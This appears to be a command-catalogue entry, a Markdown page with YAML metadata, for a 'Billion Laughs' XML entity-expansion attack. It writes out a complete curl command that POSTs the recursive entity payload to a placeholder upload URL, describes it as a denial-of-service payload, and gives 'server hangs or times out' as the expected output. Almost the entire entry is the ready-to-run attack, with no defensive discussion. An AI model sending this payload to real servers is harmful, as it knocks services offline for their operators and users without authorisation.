---
id: c-curl-billion-laughs
data: >-
  curl -X POST -H "Content-Type: application/xml" -d '<?xml><!DOCTYPE lolz
  [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;"><!ENTITY lol3
  "&lol2;&lol2;&lol2;&lol2;"><!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;"><!ENTITY
  lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;"><!ENTITY
  lol6 "&lol5;&lol5;"><!ENTITY lol7
  "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;"><!ENTITY lol8
  "&lol7;&lol7;"><!ENTITY lol9
  "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;"><lolz>&lol9;</lolz></xml>'
  http://target-subdomain.example.com/upload
tags:
  - xxe
  - dos
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:10.287Z'
verified: false
validated: true
submitted: true
---
# curl -X POST -H "Content-Type: application/xml" -d 'Billion Laughs XML' http://target-subdomain.example.com/upload

## Command

```bash
curl -X POST -H "Content-Type: application/xml" -d '<?xml><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;"><!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;"><!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;"><!ENTITY lol6 "&lol5;&lol5;"><!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;"><!ENTITY lol8 "&lol7;&lol7;"><!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;"><lolz>&lol9;</lolz></xml>' http://target-subdomain.example.com/upload
```

## Description

Sends recursive entity payload for DoS.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-d` | DoS payload | Yes |

## Examples

### Basic Usage

```bash
curl ... (as above)
```

## Expected Output

Server hangs or times out.

## Related

- [[procedures/Attempt-XXE-Exploitation]]
